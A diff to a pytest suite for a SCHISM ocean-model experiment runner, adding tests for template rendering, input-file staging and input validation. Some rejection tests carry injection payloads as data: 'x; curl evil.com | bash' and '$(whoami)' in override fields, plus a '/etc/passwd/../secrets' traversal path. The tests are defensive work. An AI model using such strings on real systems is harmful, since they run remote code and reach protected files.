@@ -155,6 +155,57 @@ class TestCreateExperiment:
                 template="does_not_exist",
             )
 
+    def test_rejects_shell_injection_in_output_dir(self, runner, tmp_path):
+        """Template variables used in shell contexts must be sanitized."""
+        with pytest.raises(RunnerError, match="Unsafe value"):
+            runner.create_experiment(
+                model_type="schism",
+                run_dir=str(tmp_path / "inject"),
+                overrides={"output_dir": "x; curl evil.com | bash"},
+            )
+
+    def test_rejects_shell_injection_in_job_name(self, runner, tmp_path):
+        with pytest.raises(RunnerError, match="Unsafe value"):
+            runner.create_experiment(
+                model_type="schism",
+                run_dir=str(tmp_path / "inject2"),
+                overrides={"job_name": "test$(whoami)"},
+            )
+
+    def test_safe_shell_values_accepted(self, runner, tmp_path):
+        """Normal values with dots, slashes, hyphens should pass."""
+        run_dir = str(tmp_path / "safe_vals")
+        result = runner.create_experiment(
+            model_type="schism",
+            run_dir=run_dir,
+            overrides={"output_dir": "outputs/run-1", "job_name": "my_run.v2"},
+        )
+        assert result["status"] == "created"
+
+    def test_user_total_tasks_respected(self, runner, tmp_path):
+        """User-provided total_tasks should not be overwritten."""
+        run_dir = str(tmp_path / "user_total")
+        runner.create_experiment(
+            model_type="schism",
+            run_dir=run_dir,
+            overrides={"atm_tasks": 80, "ocn_tasks": 80, "total_tasks": 400},
+        )
+        content = (Path(run_dir) / "run_ufs.sh").read_text()
+        assert "srun --label -n 400" in content
+
+    def test_datm_in_template_rendering(self, runner, tmp_path):
+        """datm_in template variables are rendered correctly."""
+        run_dir = str(tmp_path / "datm_render")
+        runner.create_experiment(
+            model_type="schism",
+            run_dir=run_dir,
+            overrides={"datm_datamode": "CORE2_NYF", "datm_nx": 720, "datm_ny": 361},
+        )
+        content = (Path(run_dir) / "datm_in").read_text()
+        assert 'datamode = "CORE2_NYF"' in content
+        assert "nx_global = 720" in content
+        assert "ny_global = 361" in content
+
 
 class TestStageInputData:
     """Test input data staging from user directories."""
@@ -201,8 +252,6 @@ class TestStageInputData:
         staged = result["staged_files"]
         assert "hgrid.gr3" in staged
         assert "hgrid.ll" in staged
-        # vgrid.in already exists in the template, so it should NOT be staged
-        assert "vgrid.in" not in staged
         assert "drag.gr3" in staged
         assert Path(run_dir, "hgrid.gr3").exists()
 
@@ -233,20 +282,36 @@ class TestStageInputData:
         assert "module-setup.sh" in staged
         assert any("modulefiles" in f for f in staged)
 
-    def test_stage_does_not_overwrite_template(self, runner, tmp_path):
-        """Template files should not be overwritten by staged files."""
+    def test_domain_files_override_template_stubs(self, runner, tmp_path):
+        """Domain-specific files from input_dir should replace template stubs."""
         input_dir = self._make_input_dir(tmp_path)
-        # Create a file in input_dir that also exists in the template
-        (input_dir / "bctides.in").write_text("FROM INPUT DIR")
-        run_dir = str(tmp_path / "no_overwrite")
+        (input_dir / "bctides.in").write_text("REAL DOMAIN BCTIDES")
+        (input_dir / "station.in").write_text("REAL DOMAIN STATIONS")
+        run_dir = str(tmp_path / "domain_override")
+        result = runner.create_experiment(
+            model_type="schism",
+            run_dir=run_dir,
+            input_data_dir=str(input_dir),
+        )
+        staged = result["staged_files"]
+        assert "bctides.in" in staged
+        assert "station.in" in staged
+        # User's version should have replaced the template stub
+        assert (Path(run_dir) / "bctides.in").read_text() == "REAL DOMAIN BCTIDES"
+        assert (Path(run_dir) / "station.in").read_text() == "REAL DOMAIN STATIONS"
+
+    def test_non_domain_template_files_not_overwritten(self, runner, tmp_path):
+        """Non-domain template files (configs) should not be overwritten."""
+        input_dir = self._make_input_dir(tmp_path)
+        (input_dir / "param.nml").write_text("SHOULD NOT REPLACE")
+        run_dir = str(tmp_path / "no_config_overwrite")
         runner.create_experiment(
             model_type="schism",
             run_dir=run_dir,
             input_data_dir=str(input_dir),
         )
-        # The template version should have been kept
-        content = (Path(run_dir) / "bctides.in").read_text()
-        assert content != "FROM INPUT DIR"
+        content = (Path(run_dir) / "param.nml").read_text()
+        assert content != "SHOULD NOT REPLACE"
 
     def test_stage_records_in_metadata(self, runner, tmp_path):
         input_dir = self._make_input_dir(tmp_path)
@@ -266,6 +331,15 @@ class TestStageInputData:
                 model_type="schism",
                 run_dir=str(tmp_path / "bad_stage"),
                 input_data_dir=str(tmp_path / "nope"),
+            )
+
+    def test_stage_rejects_disallowed_path(self, runner, tmp_path):
+        """input_data_dir must be under an allowed path prefix."""
+        with pytest.raises(RunnerError, match="not under an allowed path"):
+            runner.create_experiment(
+                model_type="schism",
+                run_dir=str(tmp_path / "safe_run"),
+                input_data_dir="/etc/passwd/../secrets",
             )
 
     def test_stage_no_data_dir(self, runner, tmp_path):
